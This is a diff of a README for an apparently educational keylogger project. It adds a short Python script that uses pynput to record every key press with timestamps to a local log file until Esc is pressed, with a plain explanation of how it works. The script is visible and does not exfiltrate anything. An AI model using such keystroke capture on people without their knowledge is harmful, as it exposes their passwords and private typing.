@@ -70,28 +70,41 @@ During this project, several challenges were encountered and resolved:
 
 ## Script Overview
 
-Each part of the code in keylogger_script.py is briefly explained below to help other users understand its function:
+This Python script listens for key presses and logs them to a file (`key_log.txt`). It uses the `pynput` library to capture key events and the `logging` module to record them with timestamps.
 
- python
+### How It Works:
+  1. The script monitors all key presses and logs each key pressed to a log file.
+  2. Special keys (like Shift, Ctrl, etc.) are also logged as "special key" presses.
+  3. The script stops when the `Esc` key is pressed.
 
-    from pynput import keyboard
+### Logging:
+  - All key presses are logged in the `key_log.txt` file, with a timestamp of when each key was pressed.
+
+python
+    
     import logging
+    from pynput import keyboard
     from datetime import datetime
 
-    # Setup logging configuration
-    logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
+    # Set up logging
+    log_file_path = "key_log.txt"
+    logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-    # Function to log keystrokes
     def on_press(key):
-    logging.info(f"{key} pressed")
+      try:
+          logging.info(f'Key {key.char} pressed')
+      except AttributeError:
+          logging.info(f'Special key {key} pressed')
 
-    # Start listener
-    with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+    def on_release(key):
+       if key == keyboard.Key.esc:
+          return False  # Stop listener
 
-  - pynput: Used to capture keystrokes.
-  - logging: Logs each keystroke into key_log.txt with date and timestamp.
-  - keyboard.Listener: Initiates listening and logging until manually stopped.
+    if __name__ == "__main__":
+        print("Keylogger is running...")
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+
 
 ## Future Improvements
 
